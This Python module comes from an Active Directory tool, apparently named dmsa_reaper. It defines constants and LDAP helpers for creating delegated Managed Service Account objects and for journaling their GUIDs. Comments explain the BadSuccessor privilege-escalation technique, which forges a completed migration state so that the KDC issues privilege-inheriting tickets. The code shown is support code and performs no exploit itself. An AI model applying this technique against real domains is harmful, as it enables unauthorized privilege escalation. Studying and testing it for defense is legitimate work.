from __future__ import annotations

import os

from ldap3 import BASE, Connection

from dmsa_reaper.ldap.query import ensure_search_succeeded
from dmsa_reaper.models import Operation
from dmsa_reaper.utils import bytes_to_guid_le

DMSA_OBJECT_CLASSES = [
    "top",
    "person",
    "organizationalPerson",
    "user",
    "computer",
    "msDS-DelegatedManagedServiceAccount",
]

# userAccountControl = WORKSTATION_TRUST_ACCOUNT (4096)
DMSA_UAC = 4096

# msDS-ManagedPasswordInterval: managed password rotation period in days.
# 30 matches the Microsoft schema default for msDS-ManagedServiceAccount.
DMSA_MANAGED_PASSWORD_INTERVAL = 30

# msDS-DelegatedMSAState values (from Akamai BadSuccessor research + MS-ADSC).
#   0 = unknown / not set
#   1 = migration in progress
#   2 = migration completed  ← use for BadSuccessor-style simulated migration
#   3 = standalone dMSA (no preceding account)
#
# The BadSuccessor technique simulates a *completed* migration by writing
# msDS-DelegatedMSAState = 2 directly, bypassing the official RootDSE operation.
# The KDC checks this value when deciding whether to issue PAC-inheriting tickets.
DMSA_STATE_UNKNOWN = 0
DMSA_STATE_IN_PROGRESS = 1
DMSA_STATE_COMPLETED = 2
DMSA_STATE_STANDALONE = 3


def generate_dmsa_name(hint: str | None = None) -> str:
    """Return a unique dMSA CN using a random 3-byte suffix."""
    suffix = os.urandom(3).hex()
    base = hint.rstrip("$") if hint else "dmsarpr"
    return f"{base}-{suffix}"


def dmsa_dn(cn: str, container_dn: str) -> str:
    return f"CN={cn},{container_dn}"


def resolve_meta(meta: dict, *keys: str) -> str | None:
    """Read a value from direct metadata keys or the nested 'path' dict."""
    for key in keys:
        val = meta.get(key)
        if val is not None:
            return val
    path = meta.get("path")
    if isinstance(path, dict):
        for key in keys:
            val = path.get(key)
            if val is not None:
                return val
    return None


def read_attribute(conn: Connection, dn: str, attribute: str) -> list | None:
    """Read a single attribute from LDAP.

    Returns a list of raw values or None when the attribute is absent/object not found.
    """
    ok = conn.search(
        search_base=dn,
        search_filter="(objectClass=*)",
        search_scope=BASE,
        attributes=[attribute],
    )
    ensure_search_succeeded(conn, ok, f"read {attribute!r} on {dn!r}")
    if not conn.entries:
        return None
    entry = conn.entries[0]
    if attribute not in entry:
        return None
    vals = entry[attribute].values
    return list(vals) if vals else None


def read_object_guid(conn: Connection, dn: str) -> str:
    """Read the server-assigned objectGUID immediately after object creation."""
    ok = conn.search(
        search_base=dn,
        search_filter="(objectClass=*)",
        search_scope=BASE,
        attributes=["objectGUID"],
    )
    ensure_search_succeeded(conn, ok, f"read objectGUID on {dn!r}")
    if not conn.entries:
        raise RuntimeError(f"created object cannot be re-read for GUID journaling: {dn}")
    entry = conn.entries[0]
    if "objectGUID" not in entry:
        raise RuntimeError(f"created object has no readable objectGUID: {dn}")
    attr = entry["objectGUID"]
    raw_values = getattr(attr, "raw_values", None) or []
    if raw_values and isinstance(raw_values[0], (bytes, bytearray)):
        raw = bytes(raw_values[0])
        if len(raw) == 16:
            return bytes_to_guid_le(raw)
    value = getattr(attr, "value", None)
    if value:
        return str(value).lower()
    values = getattr(attr, "values", None) or []
    if values:
        return str(values[0]).lower()
    raise RuntimeError(f"created object has an empty objectGUID: {dn}")


def journal_created_object(operation: Operation, conn: Connection, dn: str) -> str:
    """Bind a created DN to its immutable GUID before later writes continue."""
    guid = read_object_guid(conn, dn)
    operation.metadata.setdefault("created_objects", {})[dn] = {"object_guid": guid}
    return guid
